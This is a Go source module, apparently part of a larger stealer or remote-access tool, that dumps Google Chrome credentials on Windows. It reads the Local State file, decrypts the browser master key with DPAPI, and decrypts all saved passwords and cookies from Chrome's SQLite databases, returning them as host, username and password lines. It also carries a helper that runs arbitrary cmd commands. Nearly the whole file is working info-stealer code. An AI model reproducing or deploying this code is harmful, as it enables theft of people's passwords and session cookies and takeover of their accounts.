package modules

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strings"

	_ "github.com/mattn/go-sqlite3"

	"github.com/zavla/dpapi"
)

func WebbrowserStealer() string {
	var help bool
	var dumpAll bool
	var check bool
	var t bool
	var output string
	var host string

	fs := flag.NewFlagSet("creds", flag.ExitOnError)

	err := fs.Parse(os.Args[1:])
	if err != nil {
		return "N/A"
	}
	if t {
		return "N/A"
	}

	if help {
		fs.Usage()
		return "N/A"
	}
	res := ChromeStealer(host, output, dumpAll, check)
	return res
}

//code:

func CmdOut(command string) (string, error) {
	cmd := exec.Command("cmd", "/C", command)
	output, err := cmd.CombinedOutput()
	out := string(output)
	return out, err
}

type Credential struct {
	Host     string `json:"host"`
	Username string `json:"username"`
	Password string `json:"password"`
}
type Cookie struct {
	Name  string `json:"name"`
	Value string `json:"value"`
	Host  string `json:"host"`
}
type Data struct {
	Cookies     []Cookie     `json:"cookies"`
	Credentials []Credential `json:"credentials"`
}

var masterKey []byte
var chromePath string = strings.Replace(os.Getenv("APPDATA")+"\\Google\\Chrome\\User Data", "Roaming", "Local", -1)

func getWebMasterKey(path string) ([]byte, error) {
	var masterKey []byte
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return masterKey, err
	}

	content, err := ioutil.ReadFile(path)
	if err != nil {
		return masterKey, err
	}

	if !strings.Contains(string(content), "os_crypt") {
		return masterKey, fmt.Errorf("Invalid content")
	}

	var localState struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}

	if err := json.Unmarshal(content, &localState); err != nil {
		return masterKey, err
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(localState.OsCrypt.EncryptedKey)
	if err != nil {
		return masterKey, err
	}
	masterKey = encryptedKey[5:]
	decryptedKey, err := dpapi.Decrypt(masterKey)
	if err != nil {
		return masterKey, err
	}

	return decryptedKey, nil
}

func DecryptPassword(buff []byte, masterKey []byte) string {
	iv := buff[3:15]
	payload := buff[15:]
	block, _ := aes.NewCipher(masterKey)
	gcm, _ := cipher.NewGCM(block)
	decryptedPass, _ := gcm.Open(nil, iv, payload, nil)
	return string(decryptedPass)
}
func ChromeDumpCookies() ([]Cookie, error) {
	var cookies []Cookie
	cookiePath := chromePath + "\\Default\\Network\\Cookies"
	if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
		return cookies, err
	}
	db, err := sql.Open("sqlite3", cookiePath)
	if err != nil {
		return cookies, err
	}
	defer db.Close()
	rows, err := db.Query("SELECT host_key, name, encrypted_value FROM cookies")
	if err != nil {
		return cookies, err
	}
	defer rows.Close()

	for rows.Next() {
		var host string
		var name string
		var value []byte
		err = rows.Scan(&host, &name, &value)
		if err != nil {
			return cookies, err
		}
		decrypted := DecryptPassword(value, masterKey)
		cookie := Cookie{name, decrypted, host}
		cookies = append(cookies, cookie)
	}
	return cookies, nil
}
func ChromeCrackCookies(web string) ([]Cookie, error) {
	var cookies []Cookie
	cookiePath := chromePath + "\\Default\\Network\\Cookies"
	if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
		return cookies, err
	}
	db, err := sql.Open("sqlite3", cookiePath)
	if err != nil {
		return cookies, err
	}
	defer db.Close()
	rows, err := db.Query("SELECT host_key, name, encrypted_value FROM cookies where host_key like '%" + web + "%'")
	if err != nil {
		return cookies, err
	}
	defer rows.Close()

	for rows.Next() {
		var host string
		var name string
		var value []byte
		err = rows.Scan(&host, &name, &value)
		if err != nil {
			return cookies, err
		}
		decrypted := DecryptPassword(value, masterKey)
		cookie := Cookie{name, decrypted, host}
		cookies = append(cookies, cookie)
	}
	return cookies, nil
}
func ChromeCrackCredentials() ([]Credential, error) {
	var credentials []Credential
	credPath := chromePath + "\\Default\\Login Data"
	if _, err := os.Stat(credPath); os.IsNotExist(err) {
		return credentials, err
	}
	db, err := sql.Open("sqlite3", credPath)
	if err != nil {
		return credentials, err
	}
	defer db.Close()
	rows, err := db.Query("SELECT origin_url, username_value, password_value FROM logins")
	if err != nil {
		return credentials, err
	}
	defer rows.Close()

	for rows.Next() {
		var host string
		var username string
		var password []byte
		err = rows.Scan(&host, &username, &password)
		if err != nil {
			return credentials, err
		}
		decrypted := DecryptPassword(password, masterKey)
		credential := Credential{host, username, decrypted}
		credentials = append(credentials, credential)
	}
	return credentials, nil
}

func ChromeStealer(host string, output string, dumpAll bool, check bool) string {
	key, err := getWebMasterKey(chromePath + "\\Local State")
	masterKey = key
	if err != nil {
		log.Fatal(err)
	}

	var cookies []Cookie
	if dumpAll {
		cookies, err = ChromeDumpCookies()
	} else {
		cookies, err = ChromeCrackCookies(host)
	}
	if err != nil {
		log.Fatal(err)
	}
	cookies = cookies
	// credentials to struct
	credentials, err := ChromeCrackCredentials()
	if err != nil {
		// obsługa błędu
		return "N/A"
	}

	// Zamiana na JSON
	jsonData, err := json.Marshal(credentials)
	if err != nil {
		// obsługa błędu
		return "N/A"
	}

	// Dekodowanie JSON do struktury
	var decodedCredentials []Credential
	err = json.Unmarshal(jsonData, &decodedCredentials)
	if err != nil {
		// obsługa błędu
		return "N/A"
	}

	// Konwersja danych do formatu string
	var result string
	for _, cred := range decodedCredentials {
		result += fmt.Sprintf("%s [] %s [] %s\n", cred.Host, cred.Username, cred.Password)
	}

	// Wydruk wyniku
	return result
}
